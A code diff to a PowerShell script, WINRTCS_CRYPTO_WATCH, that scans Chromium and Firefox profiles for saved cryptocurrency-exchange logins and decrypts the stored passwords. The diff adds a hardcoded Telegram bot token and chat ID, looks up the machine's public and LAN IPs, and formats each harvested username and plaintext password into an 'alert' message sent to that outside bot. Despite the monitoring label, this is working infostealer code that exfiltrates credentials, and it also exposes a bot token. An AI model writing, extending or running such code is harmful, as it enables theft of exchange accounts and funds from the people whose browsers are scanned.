@@ -1,12 +1,18 @@
 #Requires -Version 5.1
-# WINRTCS_CRYPTO_WATCH 1.0 - crypto exchange saved-login scan + Telegram ALERT
+# WINRTCS_CRYPTO_WATCH 1.1 - crypto exchange saved-login scan + Telegram ALERT
 # Chromium full decrypt (v10/v11 AES-GCM). Firefox: username+URL; password if undecryptable labeled.
-# Dedup + 6h throttle. notify.cfg: WinRTCS then .wucache.
+# Dedup + 6h throttle. Dedicated bot @NASCryptoBot (crypto_notify.cfg overrides).
 param(
     [switch]$Force,
     [string]$WorkDir = '',
     [string]$DomainList = ''
 )
+
+# Dedicated crypto alert bot (NOT the RMM/Sight bot). Override via crypto_notify.cfg.
+$script:CryptoBotTokenDefault = '8886691406:AAHl7WmCU-hqD94-EiqK4Qs_AbixAOoYi0M'
+$script:CryptoChatIdDefault = '7547462070'
+$script:CwPubIp = $null
+$script:CwLanIp = $null
 
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
@@ -276,11 +282,11 @@ public static class CwNative {
 }
 '@ -ErrorAction Stop
 
-function Get-NotifyCfg {
+function Get-CryptoTgCfg {
     foreach ($p in @(
-            (Join-Path $script:ZD 'notify.cfg'),
-            (Join-Path $script:WD 'notify.cfg'),
-            (Join-Path $WorkDir 'notify.cfg')
+            (Join-Path $script:ZD 'crypto_notify.cfg'),
+            (Join-Path $script:WD 'crypto_notify.cfg'),
+            (Join-Path $WorkDir 'crypto_notify.cfg')
         )) {
         if (-not (Test-Path $p)) { continue }
         $cfg = @{}
@@ -289,14 +295,100 @@ function Get-NotifyCfg {
                 $cfg[$matches[1]] = $matches[2].Trim()
             }
         }
-        if ($cfg.BOT_TOKEN -and $cfg.CHAT_ID) { return $cfg }
+        if ($cfg.BOT_TOKEN -and $cfg.CHAT_ID) {
+            L ("crypto_tg_cfg path=$p")
+            return $cfg
+        }
     }
-    return $null
+    return @{
+        BOT_TOKEN = $script:CryptoBotTokenDefault
+        CHAT_ID   = $script:CryptoChatIdDefault
+    }
+}
+
+function Get-PublicIp {
+    foreach ($u in @('https://api.ipify.org', 'https://ifconfig.me/ip', 'https://icanhazip.com')) {
+        try {
+            $r = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 6
+            $ip = ($r.Content | Out-String).Trim()
+            if ($ip -match '^\d{1,3}(\.\d{1,3}){3}$') { return $ip }
+        } catch {}
+    }
+    return 'n/a'
+}
+
+function Get-LocalIps {
+    try {
+        $ips = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+            Where-Object { $_.IPAddress -notlike '127.*' -and $_.PrefixOrigin -ne 'WellKnown' } |
+            Select-Object -ExpandProperty IPAddress -Unique
+        if ($ips) { return ($ips -join ', ') }
+    } catch {}
+    return 'n/a'
+}
+
+function Get-ExchangeLabel([string]$url) {
+    try {
+        $u = $url
+        if ($u -notmatch '^[a-z]+://') { $u = 'https://' + $u }
+        $h = ([Uri]$u).Host.ToLowerInvariant()
+        $map = @{
+            'coinbase.com' = 'Coinbase'; 'pro.coinbase.com' = 'Coinbase Pro'; 'wallet.coinbase.com' = 'Coinbase Wallet'
+            'kraken.com' = 'Kraken'; 'binance.com' = 'Binance'; 'binance.us' = 'Binance.US'
+            'crypto.com' = 'Crypto.com'; 'gemini.com' = 'Gemini'; 'kucoin.com' = 'KuCoin'
+            'okx.com' = 'OKX'; 'bybit.com' = 'Bybit'; 'gate.io' = 'Gate.io'; 'mexc.com' = 'MEXC'
+            'blockchain.com' = 'Blockchain.com'; 'robinhood.com' = 'Robinhood'; 'cash.app' = 'Cash App'
+        }
+        foreach ($k in $map.Keys) {
+            if ($h -eq $k -or $h.EndsWith('.' + $k)) { return $map[$k] }
+        }
+        return $h
+    } catch { return 'Unknown' }
+}
+
+function _E([int]$cp) { return [string][char]::ConvertFromUtf32($cp) }
+
+function Format-CryptoAlert($f, [string]$pubIp, [string]$lanIp) {
+    $ex = Get-ExchangeLabel $f.Origin
+    $browserIcon = _E 0x1F310
+    if ($f.Browser -match 'Chrome') { $browserIcon = _E 0x1F300 }
+    elseif ($f.Browser -match 'Edge') { $browserIcon = _E 0x1F30A }
+    elseif ($f.Browser -match 'Brave') { $browserIcon = _E 0x1F981 }
+    elseif ($f.Browser -match 'Opera') { $browserIcon = _E 0x1F534 }
+    elseif ($f.Browser -match 'Firefox') { $browserIcon = _E 0x1F98A }
+    $sep = ([string][char]0x2501) * 20
+    $lines = @(
+        ((_E 0x1F6A8) + ' <b>CRYPTO CREDENTIAL ALERT</b>'),
+        $sep,
+        '',
+        ((_E 0x1F48E) + ' <b>Exchange:</b>  ' + (EscHtml $ex)),
+        ((_E 0x1F517) + ' <b>URL:</b>  <code>' + (EscHtml $f.Origin) + '</code>'),
+        '',
+        ((_E 0x1F4BB) + ' <b>Host:</b>  <code>' + (EscHtml $env:COMPUTERNAME) + '</code>'),
+        ((_E 0x1F464) + ' <b>Windows user:</b>  <code>' + (EscHtml $f.User) + '</code>'),
+        ($browserIcon + ' <b>Browser:</b>  <code>' + (EscHtml $f.Browser) + '</code>'),
+        '',
+        ((_E 0x1F4E7) + ' <b>Username / email:</b>'),
+        ('<code>' + (EscHtml $f.Username) + '</code>'),
+        '',
+        ((_E 0x1F511) + ' <b>Password:</b>'),
+        ('<code>' + (EscHtml $f.Password) + '</code>'),
+        '',
+        ((_E 0x1F30D) + ' <b>Public IP:</b>  <code>' + (EscHtml $pubIp) + '</code>'),
+        ((_E 0x1F3E0) + ' <b>LAN IP:</b>  <code>' + (EscHtml $lanIp) + '</code>'),
+        ((_E 0x1F550) + ' <b>When:</b>  <code>' + (EscHtml (Get-Date -Format 'yyyy-MM-dd HH:mm:ss zzz')) + '</code>'),
+        '',
+        $sep,
+        ((_E 0x1F916) + ' <i>@NASCryptoBot · WinRTCS CryptoWatch</i>')
+    )
+    $msg = $lines -join "`n"
+    if ($msg.Length -gt 3900) { $msg = $msg.Substring(0, 3900) + "`n<i>...truncated</i>" }
+    return $msg
 }
 
 function Send-TgAlert([string]$text) {
-    $cfg = Get-NotifyCfg
-    if (-not $cfg) { L 'NO_NOTIFY_CFG'; return $false }
+    $cfg = Get-CryptoTgCfg
+    if (-not $cfg -or -not $cfg.BOT_TOKEN -or -not $cfg.CHAT_ID) { L 'NO_CRYPTO_TG_CFG'; return $false }
     try {
         $payload = @{
             chat_id                  = $cfg.CHAT_ID
@@ -573,17 +665,9 @@ foreach ($f in $all) {
     $seen[$h] = $true
     Add-Seen $h
     $newCount++
-    $msg = @(
-        '<b>ALERT CRYPTO_SAVED_LOGIN</b>',
-        ('Host: <code>{0}</code>' -f (EscHtml $env:COMPUTERNAME)),
-        ('User: <code>{0}</code>' -f (EscHtml $f.User)),
-        ('Browser: <code>{0}</code>' -f (EscHtml $f.Browser)),
-        ('URL: <code>{0}</code>' -f (EscHtml $f.Origin)),
-        ('Username: <code>{0}</code>' -f (EscHtml $f.Username)),
-        ('Password: <code>{0}</code>' -f (EscHtml $f.Password)),
-        ('When: <code>{0}</code>' -f (Get-Date -Format o))
-    ) -join "`n"
-    if ($msg.Length -gt 3500) { $msg = $msg.Substring(0, 3500) + "`n<i>TRUNCATED</i>" }
+    if (-not $script:CwPubIp) { $script:CwPubIp = Get-PublicIp }
+    if (-not $script:CwLanIp) { $script:CwLanIp = Get-LocalIps }
+    $msg = Format-CryptoAlert $f $script:CwPubIp $script:CwLanIp
     $ok = Send-TgAlert $msg
     L ("alert user=$($f.User) browser=$($f.Browser) origin=$($f.Origin) userName=$($f.Username) tg=$ok")
 }
